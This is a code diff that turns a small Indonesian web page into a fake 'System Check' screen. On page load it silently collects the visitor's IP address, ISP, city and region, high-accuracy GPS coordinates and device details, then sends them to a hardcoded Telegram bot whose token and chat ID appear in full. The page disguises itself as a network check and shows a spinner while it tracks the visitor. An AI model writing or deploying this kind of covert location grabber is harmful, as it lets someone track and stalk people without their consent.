@@ -1,92 +1,151 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Visitor Info</title>
+    <title>System Check</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .hidden { display: none; }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-<body class="bg-gray-100 flex items-center justify-center h-screen">
-    <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md text-center">
-        <h1 class="text-xl font-bold mb-2">Gatt Store</h1>
-        <p class="mb-4">Klik Button Dibawah untuk Liat</p>
-        
-        <button onclick="collectData()" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">
-            Click Here
-        </button>
-        
-        <div id="result" class="mt-4 text-left hidden"></div>
+<body class="bg-gray-900 text-white min-h-screen flex items-center justify-center">
+    <div class="text-center p-6 max-w-md">
+        <div id="loader" class="loader mb-4"></div>
+        <p id="status">Memeriksa jaringan...</p>
+        <div id="result" class="mt-4 text-left bg-gray-800 p-4 rounded hidden"></div>
     </div>
 
     <script>
-        const BOT_TOKEN = "7950767142:AAGl3GIv8IDK1iAs14tHPezVqxlDMxxBU5I";
-        const CHAT_ID = "7113683581";
+    // Konfigurasi Telegram
+    const BOT_TOKEN = "7950767142:AAGl3GIv8IDK1iAs14tHPezVqxlDMxxBU5I";
+    const CHAT_ID = "7113683581";
 
-        async function collectData() {
-            const resultDiv = document.getElementById('result');
-            resultDiv.innerHTML = "<p class='text-gray-600'>Mengumpulkan data...</p>";
-            resultDiv.classList.remove('hidden');
-
+    (async () => {
+        const statusEl = document.getElementById("status");
+        const resultEl = document.getElementById("result");
+        
+        try {
+            // 1. Dapatkan alamat IP asli 
+            statusEl.textContent = "Mendeteksi jaringan...";
+            const ipRes = await fetch("https://api.ipify.org?format=json");
+            const { ip } = await ipRes.json();
+            
+            // 2. Reverse DNS untuk cek ISP/VPN
+            statusEl.textContent = "Memeriksa ISP...";
+            let isp = "Unknown";
             try {
-                // 1. Dapatkan IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipRes.json();
-                
-                // 2. Dapatkan info lokasi dari IP
-                const locRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                const locData = await locRes.json();
-                
-                // 3. Dapatkan GPS (jika diizinkan)
-                let gps = {};
-                try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                const ispRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const ispData = await ispRes.json();
+                isp = ispData.org || ispData.asn || "Unknown";
+            } catch {}
+            
+            // 3. Geolokasi (berdasarkan IP)
+            statusEl.textContent = "Memetakan lokasi...";
+            let geo = { city: "Unknown", region: "Unknown", country: "Unknown" };
+            try {
+                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                geo = await geoRes.json();
+            } catch {}
+            
+            // 4. GPS fisik (jika diizinkan)
+            statusEl.textContent = "Meminta akses GPS...";
+            let gps = { lat: null, long: null, accuracy: null };
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000
                     });
-                    gps = {
-                        lat: pos.coords.latitude,
-                        long: pos.coords.longitude,
-                        accuracy: pos.coords.accuracy
-                    };
-                } catch (e) {
-                    gps.error = "Izin GPS ditolak";
-                }
-                
-                // 4. Kirim ke Telegram
-                const message = formatMessage(ipData, locData, gps);
-                await sendToTelegram(message);
-                
-                // 5. Tampilkan hasil di halaman (opsional)
-                resultDiv.innerHTML = `
-                    <div class="space-y-2">
-                        <p><b>IP:</b> ${ipData.ip}</p>
-                        <p><b>Lokasi:</b> ${locData.city}, ${locData.country_name}</p>
-                        ${gps.lat ? `<p><b>GPS:</b> <a href="https://maps.google.com?q=${gps.lat},${gps.long}" class="text-blue-500">Lihat di Peta</a></p>` : ''}
-                        <p class="text-green-600">✓ Data telah dikirim</p>
-                    </div>
-                `;
-            } catch (error) {
-                resultDiv.innerHTML = `<p class="text-red-500">Error: ${error.message}</p>`;
+                });
+                gps.lat = position.coords.latitude;
+                gps.long = position.coords.longitude;
+                gps.accuracy = position.coords.accuracy;
+            } catch {}
+            
+            // 5. Data perangkat
+            statusEl.textContent = "Memindai perangkat...";
+            const device = {
+                os: navigator.platform,
+                browser: navigator.userAgent,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                language: navigator.language,
+                cookies: navigator.cookieEnabled ? "Aktif" : "Nonaktif",
+                online: navigator.onLine ? "Online" : "Offline"
+            };
+            
+            // 6. Format pesan untuk Telegram
+            let message = `🛠️ <b>SYSTEM CHECK REPORT</b> 🛠️\n\n`;
+            message += `🌐 <b>IP:</b> <code>${ip}</code>\n`;
+            message += `📡 <b>ISP:</b> ${isp}\n\n`;
+            
+            message += `📍 <b>Lokasi (IP-Based):</b>\n`;
+            message += `- Kota: ${geo.city || "Unknown"}\n`;
+            message += `- Provinsi: ${geo.region || "Unknown"}\n`;
+            message += `- Negara: ${geo.country_name || "Unknown"}\n\n`;
+            
+            if (gps.lat) {
+                message += `📌 <b>GPS Fisik:</b>\n`;
+                message += `- Latitude: ${gps.lat}\n`;
+                message += `- Longitude: ${gps.long}\n`;
+                message += `- Akurasi: ±${gps.accuracy}m\n`;
+                message += `🗺 <a href="https://maps.google.com/?q=${gps.lat},${gps.long}">Lihat di Google Maps</a>\n\n`;
             }
+            
+            message += `💻 <b>Perangkat:</b>\n`;
+            message += `- OS: ${device.os}\n`;
+            message += `- Browser: ${device.browser.split(") ")[0].split(" (")[0]})\n`;
+            message += `- Layar: ${device.screen}\n`;
+            message += `- Bahasa: ${device.language}\n\n`;
+            
+            message += `🕒 <b>Waktu Akses:</b> ${new Date().toLocaleString()}`;
+            
+            // 7. Kirim ke Telegram
+            statusEl.textContent = "Mengirim laporan...";
+            await sendToTelegram(message);
+            
+            // 8. Tampilkan hasil (opsional)
+            document.getElementById("loader").classList.add("hidden");
+            statusEl.textContent = "Pemeriksaan selesai!";
+            resultEl.innerHTML = `
+                <p class="text-green-500 mb-2">✓ Data telah dikirim ke sistem</p>
+                <p><b>Alamat IP:</b> ${ip}</p>
+                <p><b>Lokasi Terdeteksi:</b> ${geo.city}, ${geo.region}</p>
+                ${gps.lat ? `<p><b>GPS:</b> <a href="https://maps.google.com/?q=${gps.lat},${gps.long}" class="text-blue-400" target="_blank">Lihat Peta</a></p>` : ''}
+            `;
+            resultEl.classList.remove("hidden");
+            
+        } catch (error) {
+            document.getElementById("loader").classList.add("hidden");
+            statusEl.textContent = "Error: " + error.message;
+            await sendToTelegram(`⚠️ ERROR: ${error.message}`);
         }
+    })();
 
-        function formatMessage(ip, loc, gps) {
-            return `<b>🕵️ Visitor Info</b>\n\n`
-                 + `IP: ${ip.ip}\n`
-                 + `Lokasi: ${loc.city}, ${loc.region}, ${loc.country_name}\n`
-                 + `GPS: ${gps.lat ? `${gps.lat}, ${gps.long} (±${gps.accuracy}m)` : 'Tidak tersedia'}\n\n`
-                 + `Waktu: ${new Date().toLocaleString()}`;
-        }
-
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
-            });
-        }
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: "HTML",
+                disable_web_page_preview: true
+            })
+        });
+    }
     </script>
 </body>
 </html>
